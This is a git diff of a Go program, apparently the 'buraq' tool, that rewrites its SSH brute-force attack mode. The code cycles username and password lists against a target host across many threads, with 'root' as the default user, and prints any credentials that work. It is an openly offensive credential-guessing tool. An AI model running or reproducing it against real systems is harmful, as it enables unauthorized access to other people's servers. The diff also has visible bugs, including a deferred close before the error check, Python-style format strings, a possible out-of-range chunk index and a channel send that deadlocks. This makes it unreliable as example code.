@@ -14,135 +14,199 @@ import (
 	"flag"
 	"fmt"
 	"io/ioutil"
-	"log"
+	"net"
 	"os"
 	"strings"
 	"sync"
 	"time"
 
+	buraqlib "github.com/NovusEdge/buraq/buraqlib"
 	src "github.com/NovusEdge/buraq/src"
-	utils "github.com/NovusEdge/buraq/utils"
 )
 
+var port, threads uint
+var timeout time.Duration
+var user, userlist, passlist string
+var target string
+var verbose bool
+
+var validCreds = make(chan sshCredentials)
+
 func main() {
+	init_flags()
+
+	startTime := time.Now()
+	var wg sync.WaitGroup
+
+	users := parseUsernames(userlist)
+	users = append(users, user)
+
+	passwords := parsePasswords(passlist)
+
+	passChunkCounter := uint(0)
+
+	for i := uint(0); i < threads; i++ {
+		wg.Add(1)
+		var atkcnfg = attackConfig{
+			target,
+			uint16(port),
+			uint16(threads),
+			users,
+			passwords[passChunkCounter],
+			timeout,
+		}
+
+		go worker(atkcnfg, &wg)
+		if passChunkCounter < threads {
+			passChunkCounter++
+		} else {
+			passChunkCounter = 0
+		}
+	}
+	wg.Wait()
+
+	timeTaken := time.Since(startTime)
+
+	close(validCreds)
+	if verbose {
+		for cred := range validCreds {
+			buraqlib.PrintInfo(fmt.Sprintf("Found valid credentials: %s:%s", cred.username, cred.password))
+		}
+	}
+
+	buraqlib.PrintInfo(fmt.Sprintf("Process completed in: %v", timeTaken))
+}
+
+func init_flags() {
+	var tout uint64
+
 	flag.Usage = func() {
 		fmt.Println(src.CommandAttackHelp)
 	}
 
 	if len(os.Args) < 2 {
-		fmt.Println(utils.ColorIt(utils.ColorYellow, "[!]: No options provided!\nRun 'buraq help attack' for usage information."))
+		buraqlib.PrintInfo("No options provided!\nRun 'buraq help attack' for usage information.")
 		os.Exit(0)
 	}
 
-	var t int
-	var port uint
-	var user string
-	var proto string
-	var threads int
-	var passlist string
-	var userlist string
-	var timeout time.Duration
+	flag.UintVar(&port, "p", 22, "Specify the port for the target ssh service running.")
+	flag.UintVar(&threads, "t", 32, "Specify the number of threads the program should use.")
 
-	flag.UintVar(&port, "port", 22, "Specifies the port on which target is hosting it's ssh service")
-	flag.IntVar(&threads, "threads", 16, "Specify the number of threads to use for the attack.")
+	flag.StringVar(&user, "u", "root", "Specify the username to be used for the attack")
 
-	flag.StringVar(&proto, "proto", "tcp", "Specify protocol used for the attack. (tcp/udp)")
+	var HOME = buraqlib.GetHomeDirectory()
+	flag.StringVar(&passlist, "passlist", HOME+"/.buraq/default_passlist.txt", "Specify the list of passwords to use.")
+	flag.StringVar(&userlist, "userlist", "", "Specify the list of usernames (if any) to use.")
 
-	flag.StringVar(&user, "user", "root", "Specifies the username to use for the attack.")
-	flag.StringVar(&userlist, "userlist", "", "Specifies a username-list for the attack.")
+	flag.Uint64Var(&tout, "timeout", 2000, "Specify the timeout for each attempt in milliseconds")
 
-	var HOME = utils.GetHomeDirectory()
-	flag.StringVar(&passlist, "passlist", HOME+"/.buraq/passlist.txt", "Specify the list of passwords to be used during the attack.")
-
-	flag.IntVar(&t, "timeout", 500, "Specifies the timeout between each attack attempt in milliseconds.")
+	flag.BoolVar(&verbose, "verbose", false, "Specify if the program should print verbose messages about it's tasks")
 
 	flag.Parse()
 
-	timeout = time.Duration(t) * time.Millisecond
-	target := os.Args[len(os.Args)-1]
-
-	attack(proto, target, port, user, userlist, passlist, timeout, threads)
-}
-
-func attack(proto string, host string, port uint, username string, userlist string, passlist string, timeout time.Duration, threads int) {
-	var wg sync.WaitGroup
-	var usernames = []string{username}
-
-	passwords := splitPasslist(passlist)
-
-	if userlist != "" {
-		content, err := ioutil.ReadFile(userlist)
-		if err != nil {
-			log.Fatal(err)
-			os.Exit(1)
-		}
-
-		usernames = append(usernames, strings.Split(string(content), "\n")...)
+	// flag checks:
+	if port > 65535 {
+		buraqlib.PrintError("Invalid port")
+		os.Exit(1)
 	}
-
-	for _, uname := range usernames {
-		wg.Add(1)
-		go attackUser(proto, host, uname, passwords, timeout, port, &wg, threads)
-	}
-	wg.Wait()
-
-}
-
-func attackUser(proto, host, username string, passwords []string, timeout time.Duration, port uint, wg *sync.WaitGroup, threads int) {
-	var w sync.WaitGroup
-	pswds := seperateIntoThreads(passwords, threads)
-
-	for _, p := range pswds {
-		w.Add(1)
-		go worker(proto, host, username, p, timeout, port, &w)
-	}
-	w.Wait()
-	wg.Done()
-}
-
-func worker(proto, host, username string, passwords []string, timeout time.Duration, port uint, w *sync.WaitGroup) {
-	for _, pass := range passwords {
-		if ok, _ := src.AttemptConnection(proto, username, host, pass, port, timeout); ok {
-			fmt.Println(utils.ColorIt(utils.ColorGreen, fmt.Sprintf("[+]: Found Working login:\n\tUsername: %s\n\tPassword: %s", username, pass)))
-			break
-		}
-	}
-	w.Done()
-}
-
-func splitPasslist(passlist string) []string {
-	file, err := ioutil.ReadFile(passlist)
-	if err != nil {
-		log.Fatal(err)
+	check_target()
+	if _, err := os.Stat(passlist); os.IsNotExist(err) {
+		buraqlib.PrintError(fmt.Sprintf("File %s does not exist\n", passlist))
 		os.Exit(1)
 	}
 
-	return strings.Split(string(file), "\n")
-}
-
-func seperateIntoThreads(passwords []string, threads int) (res [][]string) {
-	var threadLen int
-
-	if len(passwords) < threads {
-		threadLen = threads
-	} else {
-		threadLen = (len(passwords) / threads) % 100
+	if _, err := os.Stat(userlist); os.IsNotExist(err) && userlist != "" {
+		buraqlib.PrintError(fmt.Sprintf("File %s does not exist\n", userlist))
+		os.Exit(1)
 	}
 
-	return chunkSlice(passwords, threadLen)
+	timeout = time.Duration(tout) * time.Millisecond
+	target = os.Args[len(os.Args)-1]
 }
 
-func chunkSlice(slice []string, chunkSize int) [][]string {
-	var chunks [][]string
-	for i := 0; i < len(slice); i += chunkSize {
+func check_target() {
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), timeout)
+	defer conn.Close()
+
+	if err != nil {
+		buraqlib.PrintError(fmt.Sprintf("{}", err))
+		os.Exit(1)
+	}
+}
+
+type sshCredentials struct {
+	username string
+	password string
+}
+
+type attackConfig struct {
+	host      string
+	port      uint16
+	threads   uint16
+	users     []string
+	passwords []string
+	timeout   time.Duration
+}
+
+func worker(a attackConfig, wg *sync.WaitGroup) {
+	defer wg.Done()
+	for _, user := range a.users {
+		for _, password := range a.passwords {
+			if verbose {
+				buraqlib.PrintInfo(fmt.Sprintf("Trying: %s:%s", user, password))
+			}
+			ok, _ := src.SSHConnect(user, a.host, password, a.port, a.timeout)
+			if ok {
+				buraqlib.PrintSuccess(fmt.Sprintf("Successful login with credentials [u]: %s\t[p]: %s", user, password))
+				validCreds <- sshCredentials{username: user, password: password}
+				break
+			}
+		}
+	}
+}
+
+func parsePasswords(plist string) [][]string {
+	data, err := ioutil.ReadFile(plist)
+	if err != nil {
+		buraqlib.PrintError(fmt.Sprintf("{}", err))
+		os.Exit(1)
+	}
+
+	passwords := strings.Split(string(data), "\n")
+	passLen := uint(len(passwords))
+
+	if passLen < threads {
+		return [][]string{passwords}
+	}
+
+	chunkSize := (passLen + threads - 1) / threads
+
+	chunks := make([][]string, 0)
+
+	for i := uint(0); i < passLen; i += chunkSize {
 		end := i + chunkSize
 
-		if end > len(slice) {
-			end = len(slice)
+		if end > passLen {
+			end = passLen
 		}
 
-		chunks = append(chunks, slice[i:end])
+		chunks = append(chunks, passwords[i:end])
 	}
 
 	return chunks
+}
+
+func parseUsernames(ulist string) []string {
+	if ulist == "" {
+		return []string{}
+	}
+
+	data, err := ioutil.ReadFile(ulist)
+	if err != nil {
+		buraqlib.PrintError(fmt.Sprintf("{}", err))
+		os.Exit(1)
+	}
+
+	return strings.Split(string(data), "\n")
+
 }
